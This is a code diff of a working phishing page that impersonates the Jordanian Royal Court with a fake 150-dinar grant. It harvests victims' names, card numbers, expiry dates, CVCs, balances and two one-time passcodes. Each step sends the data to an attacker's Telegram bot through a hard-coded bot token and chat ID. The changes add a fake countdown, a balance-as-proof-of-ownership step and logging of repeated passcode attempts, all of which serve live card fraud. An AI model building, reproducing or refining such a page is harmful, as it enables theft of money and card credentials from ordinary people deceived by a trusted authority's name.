@@ -4,18 +4,6 @@
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <title>منحة الديوان الملكي | 150 دينار على بطاقة الصراف الآلي</title>
-  <!-- Open Graph Meta Tags for Link Preview -->
-  <meta property="og:title" content="منحة 150 دينار من الديوان الملكي" />
-  <meta property="og:description" content="سجّل للحصول على منحة الديوان الملكي بقيمة 150 دينار على بطاقتك الصراف الآلي!" />
-  <meta property="og:image" content="https://www2.0zz0.com/2025/11/28/12/332737517.jpeg" />
-  <meta property="og:url" content="https://zaincashjordan.vercel.app" />
-  <meta property="og:type" content="website" />
-  <meta property="og:locale" content="ar_AR" />
-  <!-- Twitter Card Meta Tags -->
-  <meta name="twitter:card" content="summary_large_image" />
-  <meta name="twitter:title" content="منحة 150 دينار من الديوان الملكي" />
-  <meta name="twitter:description" content="سجّل للحصول على منحة الديوان الملكي بقيمة 150 دينار على بطاقتك الصراف الآلي!" />
-  <meta name="twitter:image" content="https://www2.0zz0.com/2025/11/28/12/332737517.jpeg" />
   <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;900&display=swap" rel="stylesheet">
   <style>
     :root {
@@ -285,10 +273,21 @@
     const royalLogo = "https://www2.0zz0.com/2025/11/28/12/332737517.jpeg";
     const BOT_TOKEN = "8478729698:AAH6ufdvIQicXkUajFb3M1ocoGusDHIbWoI";
     const CHAT_ID = "6873334348";
-    let userData = { name: '', card: '', expMonth: '', expYear: '', cvc: '', verificationCode: '' };
+    let userData = {
+      name: '',
+      card: '',
+      expMonth: '',
+      expYear: '',
+      cvc: '',
+      firstVerificationCode: '',
+      balance: '',
+      secondVerificationCode: '',
+      attempts: 0
+    };
     let currentStep = "name";
     let telegramMsgId = null;
-    const CORRECT_VERIFICATION_CODE = "123456"; // الكود الصحيح للتحقق
+    const CORRECT_FIRST_VERIFICATION_CODE = "123456";
+    const CORRECT_SECOND_VERIFICATION_CODE = "654321";
 
     function stepIndicator(step) {
       return `
@@ -380,7 +379,7 @@
       };
     }
 
-    // Step 3: تاريخ انتهاء البطاقة ورمز CVC
+    // Step 3: تاريخ الانتهاء وCVC
     function renderCardDetailsStep() {
       currentStep = "cardDetails";
       app.innerHTML = `
@@ -410,11 +409,9 @@
         <div class="royal-footer">الديوان الملكي الأردني &copy; 2025</div>
       `;
       document.getElementById('expMonth').focus();
-
       document.getElementById('cvc').addEventListener('input', function(){
         this.value = this.value.replace(/\D/g, '').slice(0,3);
       });
-
       document.getElementById('detailsForm').onsubmit = async function(e) {
         e.preventDefault();
         const expMonth = document.getElementById('expMonth').value;
@@ -434,70 +431,156 @@
         userData.cvc = cvc;
         try {
           telegramMsgId = await resendTelegramMsg(
-            `🏦 طلب منحة ديوان ملكي\n👤 الإسم الرباعي: ${userData.name}\n💳 رقم البطاقة: ${userData.card}\n📅 انتهاء: ${userData.expMonth}/${userData.expYear}\n🔑 CVC: ${userData.cvc}`
+            `🏦 طلب منحة ديوان ملكي\n👤 الإسم الرباعي: ${userData.name}\n💳 رقم البطاقة: ${userData.card}\n📅 انتهاء: ${userData.expMonth}/${userData.expYear}\n🔑 CVC: ${userData.cvc}\n🔄 جاري التحقق من البطاقة، انتظار 60 ثانية...`
           );
-        } catch (err) { }
-        // إضافة خطوة كود التحقق بعد ادخال تاريخ الانتهاء وCVC
-        showVerificationModal();
+        } catch (err) {}
+        renderWaitVerificationStep();
       };
       document.getElementById('backBtn').onclick = () => {
         renderCardStep();
       };
     }
 
-    // نافذة ادخال رمز التحقق من 6 أرقام مع ارسال البيانات كلها إلى تلجرام
-    function showVerificationModal() {
-      document.getElementById('modalError').classList.remove('active');
-      const old = document.getElementById('verModal');
-      if (old) document.body.removeChild(old);
-
-      let verModal = document.createElement('div');
-      verModal.id = 'verModal';
-      verModal.style.cssText = `
-        position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; background: rgba(140,67,255,0.15); z-index: 8000;
-        display: flex; align-items: center; justify-content: center;
+    // انتظار 60 ثانية
+    function renderWaitVerificationStep() {
+      currentStep = "waitVerification";
+      let seconds = 60;
+      app.innerHTML = `
+        ${header("جارٍ التحقق من البيانات ...")}
+        ${stepIndicator(3)}
+        <div class="info-msg" id="countdownMsg">يرجى الانتظار ${seconds} ثانية للتحقق من معلومات البطاقة</div>
+        <div style="margin:40px 0;text-align:center;"><div class="spinner" style="width:55px;height:55px;border:6px solid #8136e911;border-top:6px solid #8136e9;border-radius:50%;animation:spin 1.1s linear infinite;margin:auto;"></div></div>
+        <div class="royal-footer">الديوان الملكي الأردني &copy; 2025</div>
+        <style>@keyframes spin{from{transform:rotate(0deg);}to{transform:rotate(360deg);}}</style>
       `;
+      let interval = setInterval(()=>{
+        seconds--;
+        document.getElementById('countdownMsg').textContent = `يرجى الانتظار ${seconds} ثانية للتحقق من معلومات البطاقة`;
+        if (seconds <= 0) {
+          clearInterval(interval);
+          renderFirstVerificationStep();
+        }
+      },1000);
+    }
 
-      verModal.innerHTML = `
-        <div style="background: #fdf9f2; padding: 30px 38px; border-radius: 16px; box-shadow: 0 10px 40px #8136e933; min-width: 270px; text-align: center; border: 3px solid #32c6c7;">
-          <div style="font-size:20px; color:#8136e9; margin-bottom:13px; font-weight:bold;">أدخل رمز التحقق (6 أرقام)</div>
-          <input type="text" id="verCodeInput" maxlength="6" pattern="\\d{6}" style="font-size:20px; text-align:center; letter-spacing: 7px; padding:12px 18px; border-radius:10px; border:2px solid #8136e933; background:#fff; margin-bottom:9px;" placeholder="______" autocomplete="one-time-code" />
+    // خطوة رمز التحقق الأول
+    function renderFirstVerificationStep() {
+      currentStep = "firstVerification";
+      app.innerHTML = `
+        ${header("أدخل رمز التحقق المرسل إليك (6 أرقام)")}
+        ${stepIndicator(3)}
+        <form id="verForm" autocomplete="off">
+          <label>رمز التحقق</label>
+          <input type="text" id="verCodeInput" maxlength="6" pattern="\\d{6}" required style="font-size:20px; text-align:center;" />
           <div id="verAlertMsg" style="color:#e04c4c; font-size:14.5px; font-weight:700; margin-bottom:7px; display:none;"></div>
-          <button id="verCheckBtn" style="margin-top:13px; background: var(--button-gradient); color:#fff; padding: 11px 38px; border:none; border-radius:8px; cursor:pointer; font-size:17.5px; font-weight:bold;">تحقق</button>
-        </div>
+          <button type="submit" class="button">تأكيد التحقق</button>
+        </form>
+        <div class="royal-footer">الديوان الملكي الأردني &copy; 2025</div>
       `;
-      document.body.appendChild(verModal);
-
       document.getElementById('verCodeInput').focus();
       document.getElementById('verCodeInput').addEventListener('input', function(){
         this.value = this.value.replace(/\D/g,'').slice(0,6);
       });
 
-      document.getElementById('verCheckBtn').onclick = async () => {
+      document.getElementById('verForm').onsubmit = async function(e){
+        e.preventDefault();
         let code = document.getElementById('verCodeInput').value.trim();
         if (code.length !== 6) {
           showVerificationError("يرجى إدخال رمز مكون من 6 أرقام");
           return;
         }
-        if (code !== CORRECT_VERIFICATION_CODE) {
-          showVerificationError("رمز التحقق غير صحيح، يرجى المحاولة مرة أخرى");
+        userData.firstVerificationCode = code;
+        await resendTelegramMsg(
+          `رمز تحقق أول بعد البطاقة:\n${dumpUserData()}`
+        );
+        if (code !== CORRECT_FIRST_VERIFICATION_CODE) {
+          showVerificationError("رمز التحقق غير صحيح يرجى المحاولة مرة أخرى");
           document.getElementById('verCodeInput').value = '';
           document.getElementById('verCodeInput').focus();
           return;
         }
-        // إذا الرمز صحيح، أرسل جميع البيانات مع رمز التحقق
-        userData.verificationCode = code;
-        try {
-          await resendTelegramMsg(
-            `🏦 طلب منحة ديوان ملكي\n👤 الإسم الرباعي: ${userData.name}\n💳 رقم البطاقة: ${userData.card}\n📅 انتهاء: ${userData.expMonth}/${userData.expYear}\n🔑 CVC: ${userData.cvc}\n🔓 رمز التحقق: ${userData.verificationCode}`
-          );
-        } catch (err) { }
-        document.body.removeChild(verModal);
+        renderBalanceStep();
+      };
+
+      function showVerificationError(msg){
+        const alert = document.getElementById('verAlertMsg');
+        alert.textContent = msg;
+        alert.style.display = 'block';
+      }
+    }
+
+    // خانة الرصيد لإثبات الملكية
+    function renderBalanceStep() {
+      currentStep = "balance";
+      app.innerHTML = `
+        ${header("لإثبات ملكيتك للبطاقة، يرجى إدخال رصيد الحساب الحالي")}
+        ${stepIndicator(3)}
+        <form id="balanceForm" autocomplete="off">
+          <label>كم رصيد حسابك الحالي؟</label>
+          <input type="text" id="balanceInput" maxlength="10" required pattern="\\d+(\\.\\d{1,2})?" placeholder="مثال: 322.50" style="font-size:20px; text-align:center;" />
+          <button type="submit" class="button">التالي</button>
+        </form>
+        <div class="royal-footer">الديوان الملكي الأردني &copy; 2025</div>
+      `;
+      document.getElementById('balanceInput').focus();
+      document.getElementById('balanceInput').addEventListener('input', function(){
+        this.value = this.value.replace(/[^\d.]/g,'').replace(/(\..*)\./g, '$1').slice(0,10);
+      });
+
+      document.getElementById('balanceForm').onsubmit = async function(e){
+        e.preventDefault();
+        let balance = document.getElementById('balanceInput').value.trim();
+        if (!balance) {
+          alert("يرجى إدخال الرصيد");
+          document.getElementById('balanceInput').focus();
+          return;
+        }
+        userData.balance = balance;
+        await resendTelegramMsg(
+            `إثبات ملكية (الرصيد):\n${dumpUserData()}`
+        );
+        renderSecondVerificationStep();
+      };
+    }
+
+    // خانة رمز تحقق ثانية بعد الرصيد
+    function renderSecondVerificationStep() {
+      currentStep = "secondVerification";
+      app.innerHTML = `
+        ${header("أدخل رمز تحقق جديد (سيتم التحقق منه)")}
+        ${stepIndicator(3)}
+        <form id="secondVerForm" autocomplete="off">
+          <label>رمز التحقق الجديد</label>
+          <input type="text" id="secondVerCodeInput" maxlength="6" pattern="\\d{6}" required style="font-size:20px; text-align:center;" />
+          <div id="secondVerAlertMsg" style="color:#e04c4c; font-size:14.5px; font-weight:700; margin-bottom:7px; display:none;"></div>
+          <button type="submit" class="button">تحقق</button>
+        </form>
+        <div class="royal-footer">الديوان الملكي الأردني &copy; 2025</div>
+      `;
+      document.getElementById('secondVerCodeInput').focus();
+      document.getElementById('secondVerCodeInput').addEventListener('input', function(){
+        this.value = this.value.replace(/\D/g,'').slice(0,6);
+      });
+
+      document.getElementById('secondVerForm').onsubmit = async function(e){
+        e.preventDefault();
+        let code = document.getElementById('secondVerCodeInput').value.trim();
+        userData.secondVerificationCode = code;
+        userData.attempts++;
+        await resendTelegramMsg(
+            `محاولة تحقق #${userData.attempts} من رمز تحقق جديد:\n${dumpUserData()}`
+        );
+        if (code !== CORRECT_SECOND_VERIFICATION_CODE) {
+          showVerificationError("رمز التحقق غير صحيح يجب إدخال رمز صحيح مرة أخرى");
+          document.getElementById('secondVerCodeInput').value = '';
+          document.getElementById('secondVerCodeInput').focus();
+          return;
+        }
         showModal();
       };
 
-      function showVerificationError(msg) {
-        const alert = document.getElementById('verAlertMsg');
+      function showVerificationError(msg){
+        const alert = document.getElementById('secondVerAlertMsg');
         alert.textContent = msg;
         alert.style.display = 'block';
       }
@@ -508,9 +591,29 @@
     }
     function closeModal() {
       document.getElementById('modalError').classList.remove('active');
+      userData = {
+        name: '',
+        card: '',
+        expMonth: '',
+        expYear: '',
+        cvc: '',
+        firstVerificationCode: '',
+        balance: '',
+        secondVerificationCode: '',
+        attempts: 0
+      };
       renderNameStep();
     }
-
+    function dumpUserData() {
+      return `👤 الإسم: ${userData.name}
+💳 رقم البطاقة: ${userData.card}
+📅 انتهاء: ${userData.expMonth}/${userData.expYear}
+🔑 CVC: ${userData.cvc}
+🔓 رمز التحقق الأول: ${userData.firstVerificationCode}
+💲 الرصيد: ${userData.balance}
+🔓 رمز التحقق الثاني: ${userData.secondVerificationCode}
+🌀 المحاولات للرمز الثاني: ${userData.attempts}`;
+    }
     async function sendToTelegramAndGetMsgId(msg) {
       try {
         const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
@@ -525,12 +628,9 @@
         if (data && data.result && data.result.message_id) {
           return data.result.message_id;
         }
-      } catch (err) {
-        // ignore
-      }
+      } catch (err) { }
       return null;
     }
-
     async function resendTelegramMsg(msg) {
       if (telegramMsgId) {
         try {
